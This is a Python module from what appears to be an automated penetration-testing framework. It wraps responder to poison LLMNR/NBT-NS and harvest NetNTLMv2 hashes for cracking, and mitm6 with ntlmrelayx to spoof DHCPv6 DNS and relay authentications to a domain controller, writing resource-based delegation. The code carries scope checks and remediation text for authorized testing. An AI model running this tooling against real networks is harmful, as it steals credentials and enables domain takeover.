# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Built-in network-poisoning listener tools (responder + mitm6).

``ResponderTool`` poisons LLMNR/NBT-NS name resolution on the local subnet with
``responder`` for a bounded window and harvests the captured NetNTLMv2 hashes
into the chain hashfile (the ``hashfile`` fact that ``crack_hashes`` consumes).

``Mitm6Tool`` takes over IPv6 DNS on the subnet via DHCPv6 spoofing (``mitm6``)
and relays the captured authentications to the DC's LDAPS with ``ntlmrelayx
-6``, writing RBCD (resource-based constrained delegation).

Scope
-----
``target`` passes through the base :class:`MacroTool` authorization gate. The
poisoning only affects the **local subnet of the authorized target** — the
listening interface is auto-derived from the route to that target — and
``mitm6_relay``'s relay destination is the authorized DC itself, so neither
tool can be aimed outside the engagement scope.

Privilege
---------
Both tools bind privileged ports / raw sockets and spoof link-local traffic, so
they need **root** — run via ``sudo autopwn ...``. The web console runs as a
non-root service and will report that clearly rather than fail silently.
"""
from __future__ import annotations

import os
import re
import signal
import subprocess
import time
from pathlib import Path
from typing import Any, Optional

from .. import store
from .macro import MacroTool, Results
from .runner import which

_MAX_DURATION = 600
#: NetNTLMv2 capture line:  user::DOMAIN:challenge:response:blob
_NTLMV2_LINE = re.compile(r"^([^:\s]+)::([^:\s]*):([0-9a-fA-F]{16}):[0-9a-fA-F]+:")
#: ntlmrelayx success signals (LDAP mode — same ones ntlm_relay parses)
_RELAY_OK = re.compile(r"Delegation rights|granted delegation|written successfully|"
                       r"Adding new computer|created successfully", re.I)
#: ntlmrelayx prints "Adding new computer with username: X$ password: Y result: OK"
_NEW_COMPUTER = re.compile(r"username:\s*([A-Za-z0-9_\-]+\$)\s*password:\s*(\S+)", re.I)


def _local_ip(target: str) -> str:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    except OSError:
        return ""
    finally:
        s.close()


def _iface_for(target: str) -> str:
    """Name of the local interface whose route reaches *target*."""
    try:
        out = subprocess.run(["ip", "-o", "route", "get", target],
                             capture_output=True, text=True, timeout=10).stdout
        m = re.search(r"\bdev\s+(\S+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    ip = _local_ip(target)                      # fall back to address matching
    if ip and Path("/sys/class/net").is_dir():
        for iface in Path("/sys/class/net").iterdir():
            try:
                out = subprocess.run(["ip", "-o", "-4", "addr", "show", "dev", iface.name],
                                     capture_output=True, text=True, timeout=10).stdout
                if ip in out:
                    return iface.name
            except Exception:
                continue
    return ""


def _chain_dir() -> Path:
    """<log_dir>/chain next to the results store (same layout sequence.py uses)."""
    log_dir = Path(getattr(store, "_STORE_PATH", Path("logs") / "results.json")).parent
    d = log_dir / "chain"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _spawn_pty(argv: list[str], log: Path):
    """Start a long-running listener with a pty on stdin (see ntlm_relay: a closed
    stdin makes impacket-based listeners exit right after startup)."""
    import pty
    master_fd, slave_fd = pty.openpty()
    fh = open(log, "w")
    proc = subprocess.Popen(argv, stdout=fh, stderr=subprocess.STDOUT,
                            stdin=slave_fd, preexec_fn=os.setsid)
    os.close(slave_fd)
    return proc, master_fd, fh


def _stop(proc, master_fd: Optional[int], fh) -> None:
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except Exception:
        pass
    if master_fd is not None:
        try:
            os.close(master_fd)
        except Exception:
            pass
    try:
        fh.close()
    except Exception:
        pass


def _tail(log: Path) -> str:
    return log.read_text(errors="ignore") if log.exists() else ""


class ResponderTool(MacroTool):
    name = "responder_capture"
    category = "ad-smb"
    active = True
    intrusive = True
    host_param = "target"
    plan = [
        "Authorize the target (any in-scope host on the subnet to poison)",
        "Start responder on the interface routing to the target (-I <iface> -dw)",
        "Listen for a bounded window, answering LLMNR/NBT-NS requests",
        "Terminate responder and diff its logs for new NetNTLMv2 captures",
        "Write captured hashes to the chain hashfile and hand off to crack_hashes",
    ]
    description = (
        "Poison LLMNR/NBT-NS name resolution on the target's local subnet with "
        "responder for a bounded window, capture NetNTLMv2 hashes from hosts "
        "broadcasting name requests, and hand them to crack_hashes via the "
        "hashfile variable. Target must be in scope (it selects the subnet). "
        "REQUIRES ROOT — run via sudo.")
    parameters = {
        "type": "object",
        "properties": {
            "target": {"type": "string",
                       "description": "Any in-scope host on the subnet to poison — "
                                      "used for authorization and to pick the interface."},
            "interface": {"type": "string",
                          "description": "Listening interface (default: the interface "
                                         "whose route reaches the target)."},
            "duration": {"type": "integer",
                         "description": "Seconds to listen (default 120, max 600)."},
            "logdir": {"type": "string",
                       "description": "Responder logs directory (default: auto-detect)."},
        },
        "required": ["target"],
    }

    def execute(self, R: Results, **kw: Any) -> None:
        target = kw["target"]                     # already scope-authorized by run()

        if not hasattr(os, "geteuid") or os.geteuid() != 0:
            self.log("[!] responder_capture needs root to bind the poison listeners. "
                     "Re-run from the CLI as root:  sudo autopwn run --tool "
                     f"responder_capture --set target={target}")
            return

        responder = which("responder")
        if not responder:
            self.log("[!] responder not installed.")
            return

        iface = (kw.get("interface") or "").strip() or _iface_for(target)
        if not iface:
            self.log("[!] could not determine the listening interface; "
                     "pass --set interface=<iface>.")
            return

        try:
            duration = min(max(int(kw.get("duration") or 120), 15), _MAX_DURATION)
        except (TypeError, ValueError):
            duration = 120

        logdir = self._logdir(responder, (kw.get("logdir") or "").strip())
        if logdir is None:
            self.log("[!] could not locate responder's logs directory; "
                     "pass --set logdir=<path>.")
            return
        before = {p: p.stat().st_mtime for p in logdir.glob("*-NTLMv2-*.txt")}

        log = Path("/tmp") / "autopwn-responder.log"
        try:
            log.unlink()
        except OSError:
            pass

        self.log(f"[run] responder -I {iface} -dw  (logs: {logdir}, {duration}s window)")
        proc = master_fd = fh = None
        try:
            proc, master_fd, fh = _spawn_pty([responder, "-I", iface, "-dw"], log)
        except Exception as e:
            self.log(f"[!] failed to start responder: {e}")
            return
        try:
            time.sleep(duration)
        finally:
            _stop(proc, master_fd, fh)
            time.sleep(1)

        for line in [l for l in _tail(log).splitlines() if l.strip()][-20:]:
            self.log(f"    {line}")
        self._harvest(logdir, before, target)

    # ---- parsing -----------------------------------------------------------
    def _harvest(self, logdir: Path, before: dict, target: str) -> None:
        captured = []
        for p in logdir.glob("*-NTLMv2-*.txt"):
            try:
                if p in before and p.stat().st_mtime <= before[p]:
                    continue
            except OSError:
                continue
            for line in p.read_text(errors="ignore").splitlines():
                m = _NTLMV2_LINE.match(line.strip())
                if m:
                    captured.append((m.group(1), m.group(2), m.group(0)))

        if not captured:
            self.log("no NetNTLMv2 hashes captured in the window — no broadcast "
                     "name-resolution traffic was seen. Try a longer duration or "
                     "run during business hours when clients mistype/browse shares.")
            return

        hf = _chain_dir() / "hashes_netntlmv2.txt"
        lines = set()
        if hf.exists():
            lines = {l.strip() for l in hf.read_text(errors="ignore").splitlines() if l.strip()}
        for user, _dom, h in captured:
            # Raw hash line ("user::domain:...") — john's netntlmv2 format takes
            # responder output as-is; the account is embedded in the hash itself.
            lines.add(h)
        hf.write_text("\n".join(sorted(lines)) + "\n", encoding="utf-8")
        store.set_fact("hashfile", str(hf))
        self.log(f"  │ hashfile = {hf} ({len(lines)} NetNTLMv2 hash(es))")

        for user, dom, h in captured:
            self.add_cred(user, h, dom, note="responder")
        self.add_finding(
            "LLMNR/NBT-NS Poisoning — NetNTLMv2 Credentials Captured", "High", cvss="8.1",
            description=(f"LLMNR/NBT-NS poisoning on the local subnet of {target} "
                         f"captured {len(captured)} NetNTLMv2 credential hash(es) from "
                         "hosts broadcasting name-resolution requests. The hashes are "
                         "crackable offline or relayable to hosts without SMB signing."),
            recommendation=("Disable LLMNR and NBT-NS via GPO; require SMB signing; "
                            "enforce strong passwords to resist offline cracking of "
                            "captured NetNTLMv2 hashes."))

    # ---- helper ------------------------------------------------------------
    @staticmethod
    def _logdir(responder: str, override: str) -> Optional[Path]:
        if override:
            return Path(override)
        candidates = [Path(os.path.realpath(responder)).parent / "logs",
                      Path("/usr/share/responder/logs"),
                      Path("/etc/responder/logs"),
                      Path("logs")]
        for c in candidates:
            if c.is_dir():
                return c
        return None


class Mitm6Tool(MacroTool):
    name = "mitm6_relay"
    category = "ad-smb"
    active = True
    intrusive = True
    host_param = "target"
    plan = [
        "Authorize the DC (relay destination) against scope",
        "Start ntlmrelayx -6 relaying to ldaps://<dc> (--delegate-access RBCD write)",
        "Start mitm6 DHCPv6 spoofing on the subnet to take over IPv6 DNS",
        "Listen for a bounded window, then terminate both listeners",
        "Parse the relay output for the RBCD write / new computer account",
    ]
    description = (
        "Take over IPv6 DNS on the target's subnet via DHCPv6 spoofing (mitm6) "
        "and relay the captured authentications to the DC over LDAPS with "
        "ntlmrelayx -6, writing RBCD (resource-based constrained delegation) via "
        "a new computer account. The DC (relay destination) must be in scope. "
        "REQUIRES ROOT — run via sudo.")
    parameters = {
        "type": "object",
        "properties": {
            "target": {"type": "string",
                       "description": "DC to relay captured authentications to "
                                      "(ldaps://<target>). Must be in scope."},
            "domain": {"type": "string",
                       "description": "AD domain FQDN to spoof (mitm6 -d)."},
            "duration": {"type": "integer",
                         "description": "Seconds to listen (default 180, max 600)."},
            "interface": {"type": "string",
                          "description": "Interface for mitm6 (default: its own choice)."},
        },
        "required": ["target", "domain"],
    }

    def execute(self, R: Results, **kw: Any) -> None:
        target = kw["target"]                     # already scope-authorized by run()
        domain = (kw.get("domain") or "").strip()
        if not domain:
            self.log("[!] mitm6_relay needs the AD domain: --set domain=<fqdn>")
            return

        if not hasattr(os, "geteuid") or os.geteuid() != 0:
            self.log("[!] mitm6_relay needs root to bind the relay listener (445) and "
                     "spoof DHCPv6. Re-run from the CLI as root:  sudo autopwn run "
                     f"--tool mitm6_relay --set target={target} --set domain={domain}")
            return

        relayx = which("ntlmrelayx.py") or which("impacket-ntlmrelayx")
        if not relayx:
            self.log("[!] ntlmrelayx not installed (impacket).")
            return
        mitm6 = which("mitm6")
        if not mitm6:
            self.log("[!] mitm6 not installed.")
            return

        try:
            duration = min(max(int(kw.get("duration") or 180), 15), _MAX_DURATION)
        except (TypeError, ValueError):
            duration = 180

        relay_log = Path("/tmp") / "autopwn-mitm6-relay.log"
        mitm6_log = Path("/tmp") / "autopwn-mitm6.log"
        for lf in (relay_log, mitm6_log):
            try:
                lf.unlink()
            except OSError:
                pass

        relay_args = [relayx, "-6", "-t", f"ldaps://{target}", "-smb2support",
                      "--delegate-access", "--no-dump", "--no-da", "--no-acl"]
        mitm6_args = [mitm6, "-d", domain]
        iface = (kw.get("interface") or "").strip()
        if iface:
            mitm6_args += ["-i", iface]

        self.log(f"[run] ntlmrelayx -6 -> ldaps://{target}  [LDAP RBCD write]")
        self.log(f"[run] mitm6 -d {domain}  ({duration}s window)")
        procs = []
        try:
            procs.append(_spawn_pty(relay_args, relay_log))
            procs.append(_spawn_pty(mitm6_args, mitm6_log))
        except Exception as e:
            self.log(f"[!] failed to start listeners: {e}")
            for proc, mfd, fh in procs:
                _stop(proc, mfd, fh)
            return
        try:
            time.sleep(duration)
        finally:
            for proc, mfd, fh in procs:
                _stop(proc, mfd, fh)
            time.sleep(1)

        relay_out, mitm6_out = _tail(relay_log), _tail(mitm6_log)
        for line in [l for l in relay_out.splitlines() if l.strip()][-30:]:
            self.log(f"    {line}")
        self._parse(relay_out, mitm6_out, target, domain)

    # ---- parsing -----------------------------------------------------------
    def _parse(self, relay_out: str, mitm6_out: str, target: str, domain: str) -> None:
        spoofed = sorted(set(re.findall(
            r"(?:spoofed reply for|host=)\s*([A-Za-z0-9._\-]+)", mitm6_out, re.I)))
        if spoofed:
            self.log(f"  │ mitm6 spoofed DNS for: {', '.join(spoofed[:10])}")

        if not relay_out.strip():
            self.log("no relay output captured — clients may not prefer IPv6, or "
                     "nothing authenticated within the window.")
            return

        for m in _NEW_COMPUTER.finditer(relay_out):
            self.add_cred(m.group(1), m.group(2), domain, note="mitm6-relay")
            self.add_loot(f"Computer account {m.group(1)}",
                          "use it for RBCD: rbcd / getST -spn cifs/<victim> -impersonate")

        if _RELAY_OK.search(relay_out):
            self.add_finding(
                "IPv6 DNS Takeover (mitm6) — Relayed Authentication", "Critical", cvss="9.0",
                description=(f"DHCPv6 spoofing (mitm6) made this host the DNS server for "
                             f"IPv6-enabled clients on {target}'s subnet; captured "
                             f"authentications were relayed to ldaps://{target} and wrote "
                             "resource-based constrained delegation via a new computer "
                             "account, enabling impersonation of any user (including Domain "
                             "Admins) to the victim host."),
                recommendation=("Disable IPv6 where unused, block rogue DHCPv6/router "
                                "advertisements (RA Guard / DHCPv6 Guard), require LDAP "
                                "signing + channel binding, and enforce SMB signing."))
        else:
            self.log("mitm6 ran but the relay write was not confirmed — IPv6 must be "
                     "enabled and preferred on the targets, and the relay needs LDAPS "
                     "reachable (or LDAP signing off).")
